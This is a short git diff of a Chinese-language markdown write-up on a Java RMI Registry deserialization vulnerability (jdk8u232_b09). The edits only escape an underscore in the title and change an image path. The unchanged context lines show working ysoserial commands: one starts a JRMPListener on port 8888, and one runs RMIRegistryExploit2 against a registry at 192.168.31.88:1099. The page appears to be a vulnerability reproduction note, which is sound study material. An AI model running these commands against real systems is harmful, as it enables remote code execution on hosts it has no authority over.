@@ -1,4 +1,4 @@
-# Java RMI Registry 反序列化漏洞 (jdk8u232_b09)
+# Java RMI Registry 反序列化漏洞 (jdk8u232\_b09)
 
 ## 漏洞描述
 
@@ -48,6 +48,6 @@ java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 Co
 java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit2 192.168.31.88 1099 jrmphost 8888
 ```
 
-![image-20200206135822418](images/image-20200206135822418.png)
+![image-20200206135822418](../.gitbook/assets/image-20200206135822418.png)
 
 Registry 会返回报错，这个没关系正常，命令会正常执行。
